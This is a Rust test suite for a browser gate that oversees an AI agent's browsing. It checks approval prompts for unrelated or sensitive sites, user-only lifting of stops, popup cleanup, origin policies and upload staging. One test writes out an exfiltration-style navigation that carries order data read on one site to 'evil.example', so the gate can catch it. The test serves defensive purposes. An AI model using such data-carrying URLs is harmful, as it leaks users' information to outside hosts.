//! The M2 review findings, round 3: navigation parity with the extension backend (every address
//! the Mono moves a tab to is judged, first reads of sensitive sites ask), who lifts a Stop, popups
//! (only the bound tab's, cleanup after a Stop, what could not be checked is told), origins that
//! follow the policy mid-run, the private staging folder (outside every folder a Mono can write
//! to, swept, size-capped, copy that observes Stop) and the submit labels an Enter presses.
//!
//! Nothing here is exempt from the gate's rules. Each test fails on the behaviour it replaced.
use super::act_tests::{
    act, act_with, login_page, plain_page, with_user_tab, write, Act, LOGIN_URL,
};
use super::fake_page::El;
use super::review2_tests::page_with_links;
use super::review_tests::{categories, gate_for, gate_tool, SESSIONS};
use super::tests::{launch_context, no_limits, rig, PROFILE};
use super::upstream::*;
use crate::mono::browser::gate::{Policy, Upstream};
use crate::mono::browser::risk::Category;
use crate::mono::browser::trust::approval::UserAnswer;
use crate::mono::browser::BrowserLevel;
use serde_json::json;
use std::sync::atomic::Ordering;
use std::time::Duration;

fn open_calls(a: &Act) -> usize {
    a.r.runner.count("--json open")
}

// ---- 1: navigation parity ----

#[test]
fn a_navigation_outside_the_task_asks_and_a_refusal_moves_nothing() {
    let a = act();
    a.on_login();
    a.answer(Some(UserAnswer::Deny));
    let before = open_calls(&a);
    let (error, text) = a.call(
        "browser_navigate",
        json!({"url": "https://elsewhere.example/x"}),
    );
    assert!(error && text.contains("Denied"), "{text}");
    let cards = a.cards();
    assert_eq!(cards.len(), 1);
    assert!(categories(&cards[0]).contains(&Category::UnrelatedDomain));
    assert_eq!(open_calls(&a), before, "the tab did not move");
    // Allowed once: the tab moves.
    a.answer(Some(UserAnswer::AllowOnce));
    let (error, text) = a.call(
        "browser_navigate",
        json!({"url": "https://elsewhere.example/x"}),
    );
    assert!(!error, "{text}");
    assert_eq!(open_calls(&a), before + 1);
}

#[test]
fn an_open_asks_for_an_address_outside_the_task_at_every_level() {
    for level in [BrowserLevel::Act, BrowserLevel::ReadOnly] {
        let a = act_with(level, no_limits());
        let (error, text) = a.call("browser_open", json!({"url": "https://unnamed.example/"}));
        assert!(!error, "{text}");
        let cards = a.cards();
        assert_eq!(cards.len(), 1, "{level:?}");
        assert!(categories(&cards[0]).contains(&Category::UnrelatedDomain));
        // A site the task names does not ask.
        a.up.note_user_domain(0, "https://named.example/");
        let (error, text) = a.call("browser_open", json!({"url": "https://named.example/"}));
        assert!(!error, "{text}");
        assert_eq!(a.cards().len(), 1, "{level:?}");
    }
}

#[test]
fn the_first_entry_to_a_sensitive_site_asks_once() {
    let a = act();
    // The task names the bank, so the sensitive site is the only question.
    a.up.note_user_domain(0, "https://vietcombank.com.vn/");
    let (error, text) = a.call(
        "browser_open",
        json!({"url": "https://vietcombank.com.vn/"}),
    );
    assert!(!error, "{text}");
    let cards = a.cards();
    assert_eq!(cards.len(), 1);
    assert_eq!(categories(&cards[0]), vec![Category::SensitiveSite]);
    let (error, text) = a.call(
        "browser_navigate",
        json!({"url": "https://vietcombank.com.vn/accounts"}),
    );
    assert!(!error, "{text}");
    assert_eq!(a.cards().len(), 1, "once");
}

#[test]
fn the_first_read_of_a_sensitive_site_asks_and_a_refusal_withholds_the_page() {
    let a = act();
    a.on_login();
    // The tab is on a bank when the Mono reads it.
    a.r.runner.lock().url = "https://www.techcombank.com.vn/home".into();
    a.answer(Some(UserAnswer::Deny));
    let (error, text) = a.call("browser_snapshot", json!({}));
    assert!(error && text.contains("withheld"), "{text}");
    let cards = a.cards();
    assert_eq!(cards.len(), 1);
    assert_eq!(categories(&cards[0]), vec![Category::SensitiveSite]);
    // Allowed: the page is read, and the next read does not ask again.
    a.answer(Some(UserAnswer::AllowOnce));
    let (error, text) = a.call("browser_read", json!({}));
    assert!(!error, "{text}");
    assert_eq!(a.cards().len(), 2);
    let (error, text) = a.call("browser_snapshot", json!({}));
    assert!(!error, "{text}");
    assert_eq!(a.cards().len(), 2, "asked once");
}

#[test]
fn an_address_that_carries_what_was_read_on_another_site_asks_as_tainted() {
    let a = act();
    let mut page = plain_page();
    page.elements
        .push(El::new("e3", "text", "Order orderreference1234567890"));
    a.on_at(page, "https://shop.example/orders");
    // The task names the other site, so the carried data is the only question.
    a.up.note_user_domain(0, "https://evil.example/");
    a.answer(Some(UserAnswer::Deny));
    let before = open_calls(&a);
    let (error, text) = a.call(
        "browser_navigate",
        json!({"url": "https://evil.example/?d=orderreference1234567890"}),
    );
    assert!(error && text.contains("Denied"), "{text}");
    let cards = a.cards();
    assert_eq!(cards.len(), 1);
    assert_eq!(categories(&cards[0]), vec![Category::Tainted]);
    assert_eq!(open_calls(&a), before, "nothing was sent to the other site");
    // The same address with nothing read in it is fine.
    a.answer(Some(UserAnswer::AllowOnce));
    let (error, text) = a.call(
        "browser_navigate",
        json!({"url": "https://evil.example/ok"}),
    );
    assert!(!error, "{text}");
    assert_eq!(a.cards().len(), 1);
}

#[test]
fn a_link_that_opens_a_new_window_is_judged_as_the_navigation_it_becomes() {
    let a = act();
    a.on(page_with_links());
    a.answer(Some(UserAnswer::Deny));
    let before = open_calls(&a);
    let (error, text) = a.call("browser_click", json!({"ref": "e50"}));
    assert!(error && text.contains("Denied"), "{text}");
    let cards = a.cards();
    assert!(categories(cards.last().unwrap()).contains(&Category::UnrelatedDomain));
    assert_eq!(open_calls(&a), before, "the address was not loaded");
    a.answer(Some(UserAnswer::AllowOnce));
    let (error, text) = a.call("browser_click", json!({"ref": "e50"}));
    assert!(!error && text.contains("same tab"), "{text}");
    assert_eq!(open_calls(&a), before + 1);
}

#[test]
fn a_new_window_link_in_the_users_own_tab_follows_the_navigation_rules() {
    let a = act();
    a.on_login();
    with_user_tab(&a, "https://docs.example/page");
    let (error, text) = a.call("browser_tabs", json!({"action": "adopt_active"}));
    assert!(!error, "{text}");
    a.set_page(page_with_links());
    a.snapshot();
    a.answer(Some(UserAnswer::Deny));
    let before = open_calls(&a);
    let cards_before = a.cards().len();
    // The same address by a link and by browser_navigate: the same question.
    let (error, text) = a.call("browser_click", json!({"ref": "e50"}));
    assert!(error && text.contains("Denied"), "{text}");
    let by_link = a.cards().last().unwrap().clone();
    assert!(categories(&by_link).contains(&Category::UnrelatedDomain));
    assert_eq!(open_calls(&a), before, "the user's tab did not move");
    let (error, text) = a.call(
        "browser_navigate",
        json!({"url": "https://www.iana.org/docs"}),
    );
    assert!(error && text.contains("Denied"), "{text}");
    assert_eq!(a.cards().len(), cards_before + 2);
    assert_eq!(open_calls(&a), before);
}

// ---- 2: a Stop is lifted by a message the user typed ----

#[test]
fn an_automations_prompt_counts_as_the_task_but_does_not_lift_a_stop() {
    let a = act();
    a.on_login();
    a.up.stop_turn(0);
    a.up.run_started_by(0, "check docs.example every morning", false);
    let (error, text) = a.call("browser_snapshot", json!({}));
    assert!(error && text.contains("stopped the browser"), "{text}");
    // Only a message the user typed lifts it.
    a.up.run_started_by(0, "carry on", true);
    let (error, text) = a.call("browser_snapshot", json!({}));
    assert!(!error, "{text}");
    // The stored prompt still names the task: its site does not ask as an unrelated one.
    let b = act();
    b.on_login();
    b.up.run_started_by(0, "look at docs.example please", false);
    let (error, text) = b.call("browser_navigate", json!({"url": "https://docs.example/"}));
    assert!(!error, "{text}");
    assert!(b.cards().is_empty(), "{:?}", b.cards());
}

#[test]
fn the_gate_passes_whether_the_turn_was_typed_to_the_upstream() {
    let session = SESSIONS.fetch_add(1, Ordering::SeqCst);
    let a = act();
    let (gate, route) = gate_for(&a, session, BrowserLevel::Act);
    a.up.note_user_domain(session, LOGIN_URL);
    gate.begin_turn(&route, "look at my account");
    let opened = gate_tool(&gate, &route, "browser_open", json!({"url": LOGIN_URL}));
    assert!(opened["isError"] != true, "{opened}");
    a.up.stop_turn(session);
    // A stored prompt of an automation is not a message the user typed.
    gate.begin_turn_as(&route, "the automation's stored prompt", false);
    let refused = gate_tool(&gate, &route, "browser_snapshot", json!({}));
    assert_eq!(refused["isError"], true, "{refused}");
    assert!(
        refused["content"][0]["text"]
            .as_str()
            .unwrap()
            .contains("stopped the browser"),
        "{refused}"
    );
    gate.begin_turn_as(&route, "go on", true);
    let again = gate_tool(&gate, &route, "browser_snapshot", json!({}));
    assert!(again["isError"] != true, "{again}");
}

// ---- 3, 4, 5, 6: popups ----

#[test]
fn only_a_popup_the_bound_tab_opened_is_closed_and_its_opener_is_read_with_get_targets() {
    let a = act();
    a.on(page_with_links());
    let (error, text) = a.call("browser_click", json!({"ref": "e52"}));
    assert!(!error, "{text}");
    assert_eq!(a.r.runner.lock().target_closes, ["POPUP0001"]);
    let argv =
        a.r.runner
            .lock()
            .calls
            .iter()
            .find(|c| c.iter().any(|w| w == "Target.getTargets"))
            .cloned()
            .expect("the opener was read");
    let tail: Vec<&str> = argv
        .iter()
        .skip_while(|w| *w != "cdp")
        .map(String::as_str)
        .collect();
    assert_eq!(
        tail,
        ["cdp", "--target", "browser", "--", "Target.getTargets"]
    );

    // A new window another page opened (the user's own) is not this page's: left alone.
    let b = act();
    b.on(page_with_links());
    b.r.runner
        .lock()
        .popup_openers
        .insert("POPUP0001".into(), "TARGETOFTHEUSERSTAB".into());
    let (error, text) = b.call("browser_click", json!({"ref": "e52"}));
    assert!(!error, "{text}");
    assert!(b.r.runner.lock().target_closes.is_empty());
    assert!(text.contains("left it alone"), "{text}");
    assert!(b.rows_of("popup_closed").is_empty());
}

#[test]
fn when_the_opener_cannot_be_read_nothing_is_closed_and_the_mono_is_told() {
    let a = act();
    a.on(page_with_links());
    a.r.runner.lock().targets_fail = true;
    let (error, text) = a.call("browser_click", json!({"ref": "e52"}));
    assert!(!error, "{text}");
    assert!(a.r.runner.lock().target_closes.is_empty());
    assert!(text.contains("may have been left open"), "{text}");
    assert_eq!(a.rows_of("popup_unchecked").len(), 1);
}

#[test]
fn the_cleanup_runs_after_a_stop() {
    let a = act();
    a.on(page_with_links());
    a.r.runner.lock().hang_on = Some("--json click".into());
    let worker = std::thread::spawn({
        let up = a.up.clone();
        move || super::tests::call(&up, "browser_click", json!({"ref": "e52"}))
    });
    assert!(super::tests::wait_until(|| a.r.runner.lock().hanging == 1));
    // The page opened a window and switched the user's window before the Stop killed the command.
    {
        let mut st = a.r.runner.lock();
        st.popups
            .push(("POPUPSTOP01".into(), "https://popup.example/x".into()));
        st.window_profile = PROFILE.to_owned();
    }
    a.up.stop_turn(0);
    let (error, text) = worker.join().unwrap();
    assert!(error && text.contains("may or may not have run"), "{text}");
    assert_eq!(a.r.runner.lock().target_closes, ["POPUPSTOP01"]);
    assert_eq!(
        a.r.runner.lock().switches.len(),
        1,
        "the window was put back"
    );
    assert!(text.contains("zptah closed it"), "{text}");
}

#[test]
fn the_window_profile_is_restored_only_when_a_new_target_appeared() {
    let a = act();
    a.on(page_with_links());
    // The window changes profile by itself, with no new target: not ours to put back.
    a.r.runner.lock().on_cmd = Some((
        "click".into(),
        Box::new(|st| st.window_profile = PROFILE.to_owned()),
    ));
    let (error, text) = a.call("browser_click", json!({"ref": "e9"}));
    assert!(!error, "{text}");
    assert!(a.r.runner.lock().switches.is_empty());
    // With a popup it is.
    let b = act();
    b.on(page_with_links());
    let (error, text) = b.call("browser_click", json!({"ref": "e52"}));
    assert!(!error, "{text}");
    assert_eq!(b.r.runner.lock().switches.len(), 1);
}

#[test]
fn type_fill_and_hover_are_watched_for_popups_too() {
    let a = act();
    a.on(plain_page());
    for (tool, cmd, args, id) in [
        (
            "browser_type",
            "type",
            json!({"ref": "e1", "text": "hello"}),
            "POPUPTYPE01",
        ),
        (
            "browser_fill",
            "fill",
            json!({"ref": "e1", "text": "hello"}),
            "POPUPFILL01",
        ),
        (
            "browser_hover",
            "hover",
            json!({"ref": "e2"}),
            "POPUPHOVER1",
        ),
    ] {
        a.r.runner.lock().on_cmd = Some((
            cmd.into(),
            Box::new(move |st| {
                st.popups
                    .push((id.into(), "https://popup.example/x".into()));
            }),
        ));
        let (error, text) = a.call(tool, args);
        assert!(!error, "{tool}: {text}");
        assert!(
            a.r.runner.lock().target_closes.contains(&id.to_owned()),
            "{tool}: the popup was not closed"
        );
    }
}

#[test]
fn what_could_not_be_listed_before_the_act_is_told_after_it() {
    // `tab list` fails.
    let a = act();
    a.on(page_with_links());
    a.r.runner.lock().tab_list_fails = true;
    let (error, text) = a.call("browser_click", json!({"ref": "e9"}));
    assert!(!error, "{text}");
    assert!(text.contains("may have been left open"), "{text}");
    assert_eq!(a.rows_of("popup_unchecked").len(), 1);
    // `windows` fails before the act.
    let b = act();
    b.on(page_with_links());
    b.r.runner.lock().windows_fail_first = 1;
    let (error, text) = b.call("browser_click", json!({"ref": "e9"}));
    assert!(!error, "{text}");
    assert!(text.contains("may have been left open"), "{text}");
    // A new target with no `targetId` cannot be told apart or closed.
    let c = act();
    c.on(page_with_links());
    c.r.runner.lock().on_cmd = Some(("click".into(), Box::new(|st| st.nameless_popups = 1)));
    let (error, text) = c.call("browser_click", json!({"ref": "e9"}));
    assert!(!error, "{text}");
    assert!(text.contains("may have been left open"), "{text}");
    // Nothing of that when everything could be read.
    let d = act();
    d.on(page_with_links());
    let (error, text) = d.call("browser_click", json!({"ref": "e9"}));
    assert!(!error, "{text}");
    assert!(!text.contains("may have been left open"), "{text}");
}

// ---- 7: origins follow the policy ----

#[test]
fn blocked_and_allowed_origins_follow_the_policy_mid_run() {
    let session = SESSIONS.fetch_add(1, Ordering::SeqCst);
    let a = act();
    a.on_login();
    let (gate, _route) = gate_for(&a, session, BrowserLevel::Act);
    let before = open_calls(&a);
    // The user blocks a site while the Mono works.
    gate.set_policy(Policy::ardia(
        BrowserLevel::Act,
        vec!["https://blocked.example".into()],
    ));
    let (error, text) = a.call(
        "browser_navigate",
        json!({"url": "https://blocked.example/x"}),
    );
    assert!(error, "{text}");
    assert_eq!(open_calls(&a), before, "the blocked address was not opened");
    // And an allowed list: nothing outside it.
    gate.set_policy(
        Policy::ardia(BrowserLevel::Act, vec![])
            .with_allowed_origins(vec!["https://only.example".into()]),
    );
    let (error, text) = a.call(
        "browser_navigate",
        json!({"url": "https://other.example/x"}),
    );
    assert!(error, "{text}");
    a.up.note_user_domain(0, "https://only.example/");
    let (error, text) = a.call("browser_navigate", json!({"url": "https://only.example/x"}));
    assert!(!error, "{text}");
    // Lifted again.
    gate.set_policy(Policy::ardia(BrowserLevel::Act, vec![]));
    a.up.note_user_domain(0, "https://other.example/");
    let (error, text) = a.call(
        "browser_navigate",
        json!({"url": "https://other.example/x"}),
    );
    assert!(!error, "{text}");
}

// ---- 9, 10: the private staging folder ----

#[test]
fn the_staging_folder_is_outside_every_folder_a_mono_can_write_to() {
    use crate::mono::browser::{resolve_ardia_with, server::BrowserServers, Attach};
    let dir = tempfile::tempdir().unwrap();
    let (_store, mut ctx) = launch_context(dir.path(), PROFILE);
    ctx.mono.id = format!("mono-s1-{}", SESSIONS.fetch_add(1, Ordering::SeqCst));
    let r = rig(false);
    let servers = BrowserServers::new();
    let Attach::Ready(_runtime) = resolve_ardia_with(&ctx, &servers, &r.controller) else {
        panic!("expected ready");
    };
    let staging = upstream_for(&ctx.mono.id).unwrap().staging_dir();
    // A Mono's chat works in the user's home folder, so the app's data folder (where the copies
    // used to be) is inside what it can write to.
    assert_ne!(
        staging,
        Some(ctx.root.join("_ardia").join("uploads")),
        "not inside the app's data folder"
    );
    match staging {
        Some(staging) => {
            assert!(!staging.starts_with(&ctx.root), "{staging:?}");
            assert!(!staging.starts_with(std::env::temp_dir()), "{staging:?}");
            if let Some(home) = uploads::home_dir() {
                assert!(!staging.starts_with(home), "{staging:?}");
            }
        }
        // Only macOS always has a folder for it; elsewhere uploads may be unavailable.
        #[cfg(target_os = "macos")]
        None => panic!("macOS always has a folder for it"),
        #[cfg(not(target_os = "macos"))]
        None => {}
    }
}

/// Sets the modification time of a file or a folder. A folder is opened for its attributes only
/// on Windows (`File::open` of a folder is refused there).
pub(super) fn set_mtime(path: &std::path::Path, at: std::time::SystemTime) {
    #[cfg(windows)]
    let file = {
        use std::os::windows::fs::OpenOptionsExt;
        // FILE_WRITE_ATTRIBUTES, and FILE_FLAG_BACKUP_SEMANTICS to open a folder.
        std::fs::OpenOptions::new()
            .access_mode(0x100)
            .custom_flags(0x0200_0000)
            .open(path)
            .unwrap()
    };
    #[cfg(not(windows))]
    let file = std::fs::File::open(path).unwrap();
    file.set_modified(at).unwrap();
}

#[test]
fn leftover_copies_are_swept_when_an_upstream_gets_its_settings() {
    let a = act();
    a.on_login();
    let root = a.path("staging");
    let live = root.join(staging_name(&session_name(&a.mono, 0)));
    write(&live.join("1/cv.pdf"), b"x");
    write(&root.join("deadbeefdeadbeef/1/old.txt"), b"x");
    write(&root.join("stray.txt"), b"x");
    let configure = |mono: &str| {
        let up =
            ArdiaUpstream::with_bind_delay(mono, a.r.controller.clone(), Duration::from_millis(1));
        up.configure(Config {
            profile: PROFILE.into(),
            staging_dir: Some(root.clone()),
            ..Config::default()
        });
        up
    };
    let _second = configure("mono-sweep-2");
    assert!(
        live.join("1/cv.pdf").exists(),
        "a live conversation keeps its copies"
    );
    assert!(
        !root.join("deadbeefdeadbeef").exists(),
        "nobody owns this folder"
    );
    assert!(!root.join("stray.txt").exists());
    // Older than a day goes even when its conversation is live: by the newest thing inside it
    // (the folder's own time alone does not count, see `flow_fix_tests`).
    let old = std::time::SystemTime::now() - Duration::from_secs(2 * 24 * 60 * 60);
    for path in [live.join("1/cv.pdf"), live.join("1"), live.clone()] {
        set_mtime(&path, old);
    }
    let _third = configure("mono-sweep-3");
    assert!(!live.exists());
}

#[test]
fn an_upload_over_the_size_cap_is_refused_before_anything_is_asked() {
    let a = act();
    a.on_login();
    let big = a.path("home/proj/big.bin");
    write(&big, b"x");
    std::fs::OpenOptions::new()
        .write(true)
        .open(&big)
        .unwrap()
        .set_len(150 * 1024 * 1024)
        .unwrap();
    let (error, text) = a.call(
        "browser_upload",
        json!({"ref": "e11", "paths": [big.to_string_lossy()]}),
    );
    assert!(
        error && text.contains("150.0 MB") && text.contains("100.0 MB limit"),
        "{text}"
    );
    assert!(a.cards().is_empty());
    assert!(a.sent().is_empty());
}

#[test]
fn the_copy_of_a_large_file_ends_at_a_stop() {
    let dir = tempfile::tempdir().unwrap();
    let home = dir.path().join("home");
    let proj = home.join("proj");
    std::fs::create_dir_all(&proj).unwrap();
    let file = proj.join("data.bin");
    write(&file, &vec![7u8; 2 * 1024 * 1024]);
    let rules = uploads::Rules {
        allowed: vec![proj.clone()],
        output_dir: None,
        home: Some(home.clone()),
        user_messages: vec![],
    };
    let files = uploads::check(&[file.to_string_lossy().into_owned()], &rules).unwrap();
    let folder = dir.path().join("staging/1");
    // The Stop arrives after the first piece was copied.
    let asked = std::sync::atomic::AtomicUsize::new(0);
    let stopped = || asked.fetch_add(1, Ordering::SeqCst) >= 1;
    let error = files[0].stage(&folder, &stopped).unwrap_err();
    assert!(error.contains("stopped"), "{error}");
    let left: Vec<_> = std::fs::read_dir(&folder)
        .map(|d| d.flatten().collect())
        .unwrap_or_default();
    assert!(left.is_empty(), "no partial copy stays: {left:?}");
    // Without a Stop the copy is made whole.
    let copy = files[0].stage(&folder, &|| false).unwrap();
    assert_eq!(std::fs::metadata(copy).unwrap().len(), 2 * 1024 * 1024);
}

// ---- 11: the submit label an Enter presses ----

#[test]
fn enter_reads_the_text_around_a_bare_continue_like_a_click_does() {
    // The sign-in page has a heading: that explains the button.
    let a = act();
    a.on_login();
    let (error, text) = a.call("browser_press", json!({"key": "Enter", "ref": "e3"}));
    assert!(!error, "{text}");
    assert!(a.cards().is_empty(), "{:?}", a.cards());
    // The same page with nothing that explains the word still asks as unclear.
    let b = act();
    let mut page = login_page();
    page.elements.remove(0);
    b.on(page);
    let (error, text) = b.call("browser_press", json!({"key": "Enter", "ref": "e3"}));
    assert!(!error, "{text}");
    let cards = b.cards();
    assert_eq!(cards.len(), 1);
    assert!(categories(&cards[0]).contains(&Category::Unclear));
}

#[test]
fn a_line_break_in_typed_text_reads_the_submit_context_too() {
    let a = act();
    a.on_login();
    let (error, text) = a.call(
        "browser_type",
        json!({"ref": "e3", "text": "me@example.com\n"}),
    );
    assert!(!error, "{text}");
    assert!(
        !a.cards()
            .iter()
            .any(|c| categories(c).contains(&Category::Unclear)),
        "{:?}",
        a.cards()
    );
}
